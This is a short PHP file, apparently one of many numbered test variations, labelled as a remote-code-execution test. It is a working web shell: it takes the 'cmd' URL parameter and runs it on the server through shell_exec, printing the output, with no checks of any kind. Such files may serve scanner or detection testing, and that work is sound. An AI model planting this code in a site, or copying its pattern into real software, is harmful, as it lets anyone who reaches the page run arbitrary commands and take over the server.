<?php
// RCE test variation #611
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>